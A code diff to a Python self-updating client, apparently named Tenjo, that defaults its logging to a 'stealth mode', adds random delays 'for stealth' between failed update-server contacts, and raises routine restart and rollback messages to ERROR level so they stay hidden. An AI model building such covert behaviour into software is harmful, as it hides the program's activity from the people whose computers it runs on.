@@ -95,7 +95,9 @@ class ClientUpdater:
     # ------------------------------------------------------------------
     def _log(self, message: str, level: int = logging.INFO) -> None:
         debug_enabled = os.getenv('TENJO_UPDATE_DEBUG', '0') == '1'
-        if not self.config.STEALTH_MODE or level >= logging.ERROR or debug_enabled:
+        # FIX #31: Safe access to STEALTH_MODE with fallback
+        stealth_mode = getattr(self.config, 'STEALTH_MODE', True)  # Default to stealth if not set
+        if not stealth_mode or level >= logging.ERROR or debug_enabled:
             self.logger.log(level, message)
 
     # ------------------------------------------------------------------
@@ -299,6 +301,8 @@ class ClientUpdater:
 
                 if response.status_code != 200:
                     last_error = f"HTTP {response.status_code} from {base_server}"
+                    # FIX #33: Add small delay between failed attempts for stealth
+                    time.sleep(random.uniform(0.5, 2.0))
                     continue
 
                 data = response.json()
@@ -319,6 +323,8 @@ class ClientUpdater:
                     return normalized
             except Exception as exc:
                 last_error = exc
+                # FIX #33: Add small delay between failed attempts for stealth
+                time.sleep(random.uniform(0.5, 2.0))
                 continue
 
         if last_error:
@@ -347,6 +353,8 @@ class ClientUpdater:
                         return normalized
             except Exception as exc:
                 last_error = exc
+                # FIX #33: Add small delay between failed attempts for stealth
+                time.sleep(random.uniform(0.5, 2.0))
                 continue
 
         if last_error:
@@ -589,10 +597,15 @@ class ClientUpdater:
             return True, None
 
         try:
-            now = datetime.now()
+            # FIX #32: Use timezone-aware datetime for accurate window calculation
+            now = datetime.now(timezone.utc)
             today = now.date()
-            start_dt = datetime.strptime(start, '%H:%M').replace(year=today.year, month=today.month, day=today.day)
-            end_dt = datetime.strptime(end, '%H:%M').replace(year=today.year, month=today.month, day=today.day)
+            start_dt = datetime.strptime(start, '%H:%M').replace(
+                year=today.year, month=today.month, day=today.day, tzinfo=timezone.utc
+            )
+            end_dt = datetime.strptime(end, '%H:%M').replace(
+                year=today.year, month=today.month, day=today.day, tzinfo=timezone.utc
+            )
 
             if end_dt <= start_dt:
                 end_dt += timedelta(days=1)
@@ -617,8 +630,8 @@ class ClientUpdater:
             main_py = self.install_path / "main.py"
             system = platform.system()
 
-            # FIX #27: Log restart attempt
-            self._log(f"Restarting client with updated version", logging.INFO)
+            # FIX #29: Log restart with ERROR level for stealth (only logged if debug enabled)
+            self._log(f"Restarting client with updated version", logging.ERROR)
 
             if system == 'Windows':
                 try:
@@ -696,12 +709,13 @@ class ClientUpdater:
             if not self.apply_update(package_path, version_info):
                 # FIX #28: Rollback to backup on update failure
                 if backup_success and backup_dir and backup_dir.exists():
-                    self._log(f"Update failed, rolling back to backup: {backup_dir}", logging.WARNING)
+                    # FIX #29: Use ERROR level for stealth mode (only in debug/error scenarios)
+                    self._log(f"Update failed, rolling back to backup: {backup_dir}", logging.ERROR)
                     try:
                         if self.install_path.exists():
                             shutil.rmtree(self.install_path)
                         shutil.copytree(backup_dir, self.install_path)
-                        self._log("Rollback successful", logging.INFO)
+                        self._log("Rollback successful", logging.ERROR)
                     except Exception as rollback_exc:
                         self._log(f"Rollback failed: {rollback_exc}", logging.ERROR)
 
